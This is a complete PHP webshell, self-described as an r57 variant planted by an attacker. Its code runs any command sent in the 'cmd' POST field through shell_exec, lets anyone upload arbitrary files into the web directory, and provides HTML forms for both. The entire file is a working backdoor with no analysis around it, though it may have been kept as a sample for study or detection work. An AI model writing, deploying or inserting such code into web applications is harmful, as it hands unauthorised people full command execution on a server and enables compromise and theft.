<?php
/**
 * r57 variant webshell — planted by attacker
 * Provides remote command execution via HTTP POST
 */
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'],
                       basename($_FILES['file']['name']));
    echo 'Uploaded: ' . basename($_FILES['file']['name']);
}
?>
<!DOCTYPE html><html><body>
<form method="POST">
  Command: <input name="cmd" size="60">
  <input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
  Upload: <input type="file" name="file">
  <input type="hidden" name="upload" value="1">
  <input type="submit" value="Upload">
</form>
</body></html>
